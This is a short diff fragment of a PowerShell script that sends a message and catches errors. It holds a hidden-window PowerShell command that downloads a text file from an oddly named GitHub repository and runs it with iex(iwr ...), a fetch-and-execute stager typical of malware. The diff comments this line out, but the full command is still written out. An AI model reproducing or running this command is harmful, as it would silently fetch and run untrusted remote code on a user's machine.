@@ -42,6 +42,6 @@ try {
 } catch {
     Write-Output "Failed to send message. Error: $_"
 }
-start powershell -windowstyle h -args 'sleep 10; iex(iwr https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber.txt -usebasicparsing)'
+#start powershell -windowstyle h -args 'sleep 10; iex(iwr https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/gaber.txt -usebasicparsing)'
 
 }
